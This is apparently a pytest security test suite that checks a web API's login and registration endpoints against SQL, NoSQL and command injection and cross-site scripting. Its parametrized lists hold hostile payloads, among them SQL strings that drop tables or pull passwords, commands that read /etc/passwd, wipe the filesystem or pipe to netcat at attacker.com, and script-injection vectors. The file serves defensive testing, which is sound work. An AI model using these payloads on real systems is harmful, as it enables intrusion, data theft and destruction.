"""
SQL Injection and other injection attack tests.

Tests OWASP A03: Injection vulnerabilities.
"""

import pytest
from httpx import AsyncClient


@pytest.mark.security
@pytest.mark.asyncio
class TestSQLInjectionPrevention:
    """Test SQL injection prevention in authentication endpoints."""

    @pytest.mark.parametrize("injection_payload", [
        # Classic SQL injection attempts
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin' /*",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "') OR ('1'='1",
        
        # Advanced SQL injection
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; INSERT INTO users (email) VALUES ('hacked@evil.com'); --",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE email='admin') = 'a",
        
        # NoSQL injection attempts
        "{'$ne': null}",
        "{'$gt': ''}",
        "'; return true; //",
        
        # Command injection attempts
        "; cat /etc/passwd",
        "| whoami",
        "&& ls -la",
        "`id`",
        "$(cat /etc/hosts)",
    ])
    async def test_login_sql_injection_prevention(
        self, 
        async_client: AsyncClient, 
        injection_payload: str
    ):
        """Test that login endpoint prevents SQL injection."""
        response = await async_client.post(
            "/api/v1/auth/login",
            json={
                "username": injection_payload,
                "password": "any_password"
            }
        )
        
        # Should return 400/401, not 500 (which indicates injection worked)
        assert response.status_code in [400, 401], f"Injection may have succeeded: {injection_payload}"
        
        # Response should not contain SQL error messages
        response_text = response.text.lower()
        sql_error_indicators = [
            "syntax error",
            "sql",
            "database",
            "mysql",
            "postgresql",
            "sqlite",
            "column",
            "table",
            "select",
            "insert",
            "update",
            "delete",
            "drop",
            "create"
        ]
        
        for indicator in sql_error_indicators:
            assert indicator not in response_text, f"SQL error leaked: {indicator}"

    @pytest.mark.parametrize("field", ["username", "email", "password"])
    async def test_registration_injection_prevention(
        self, 
        async_client: AsyncClient, 
        field: str,
        email_builder
    ):
        """Test registration endpoints prevent injection attacks."""
        injection_payload = "' OR '1'='1; DROP TABLE users; --"
        
        # Create valid registration data
        registration_data = {
            "username": "validuser",
            "email": email_builder.unique().value,
            "password": "ValidPass123!@#",
            "confirm_password": "ValidPass123!@#"
        }
        
        # Inject into specific field
        registration_data[field] = injection_payload
        
        response = await async_client.post(
            "/api/v1/auth/register",
            json=registration_data
        )
        
        # Should be rejected with 400, not cause server error
        assert response.status_code == 400
        assert "syntax error" not in response.text.lower()


@pytest.mark.security
@pytest.mark.asyncio
class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""

    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "';alert('xss');//",
        "<iframe src=javascript:alert('xss')></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
    ])
    async def test_xss_prevention_in_user_data(
        self, 
        async_client: AsyncClient, 
        xss_payload: str,
        email_builder
    ):
        """Test that user data fields prevent XSS."""
        # Try to inject XSS in username
        response = await async_client.post(
            "/api/v1/auth/register",
            json={
                "username": xss_payload,
                "email": email_builder.unique().value,
                "password": "ValidPass123!@#",
                "confirm_password": "ValidPass123!@#"
            }
        )
        
        # Response should not contain unescaped script tags
        response_text = response.text
        assert "<script>" not in response_text
        assert "javascript:" not in response_text
        assert "onerror=" not in response_text
        assert "onload=" not in response_text


@pytest.mark.security
@pytest.mark.asyncio
class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    @pytest.mark.parametrize("command_payload", [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(uname -a)",
        "; rm -rf /",
        "| nc attacker.com 4444",
    ])
    async def test_command_injection_prevention(
        self, 
        async_client: AsyncClient, 
        command_payload: str
    ):
        """Test that system commands cannot be injected."""
        response = await async_client.post(
            "/api/v1/auth/login",
            json={
                "username": f"user{command_payload}",
                "password": "password"
            }
        )
        
        # Should not execute commands or return command output
        assert response.status_code in [400, 401]
        
        # Check for command execution artifacts
        response_text = response.text.lower()
        command_artifacts = [
            "root:",  # /etc/passwd content
            "bin/bash",  # shell paths
            "uid=",  # id command output
            "gid=",  # id command output
            "linux",  # uname output
            "kernel",  # uname output
        ]
        
        for artifact in command_artifacts:
            assert artifact not in response_text, f"Command execution detected: {artifact}"